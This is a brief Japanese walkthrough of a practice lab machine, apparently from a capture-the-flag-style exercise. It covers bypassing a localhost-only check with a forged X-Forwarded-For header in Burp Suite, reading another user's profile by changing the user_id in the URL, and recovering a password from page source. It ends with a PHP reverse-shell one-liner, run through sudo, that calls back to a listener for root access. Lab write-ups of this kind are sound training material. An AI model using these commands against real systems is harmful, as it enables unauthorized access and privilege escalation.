### 論点
- burpsuiteでheaderを書き換え
### 課題
- headerのチェックのコードを見る

## 攻略
- nmap
  - 22,80
- webサイトを見る
  - サイトを見たら、localしか見れないと書いてある
  - view page sourceを見たら、x-forwarded-forをlocalにすると書いてある
- burpsuiteを起動する
  - いつものようにブラウザを起動してintercept onにしてリクエストの中身を見る。このヘッダーに`X-Forwarded-For:localhost`を書き込めばサイトを見ることができる
  - Interceptの一番右端にProxy settingsがあるので押す
  - HTTP match and replaces rulesのところでAddを押す、フォームが開くのでReplaceのところに `X-Forwarded-For:localhost`と入力してok
  - ブラウザに戻って更新する
- サイトにユーザを登録する
  - Registerを選んで登録する 
  - profileを押すとURLのリンクを見るとuser_id=12となっている。これは登録されているユーザの番号と推測できる。本来なら全部をメモっておくが、ここでは面倒なので、URLのuser_id=5にする。これが答え。パスワードは見れないが、view source codeを見るとパスワードが見れる
  - user:alice,password:4lic3
  - 使ったらburpのproxyのrequest headerのチェックを外しておく
- aliceでsshをする
- suid
  - 特になし
- sudo -l
  - phpが使えるので、reverse-shellをする
  - `php -r '$sock=fsockopen("192.168.56.101","9001");exec("/bin/sh -i <&3 >&3 2>&3");'`
- rootになる
  - Parrotで待ち受ける `nc -nlvp 9001` 
  - `sudo php -r '$sock=fsockopen("192.168.56.101","9001");exec("/bin/sh -i <&3 >&3 2>&3");'`
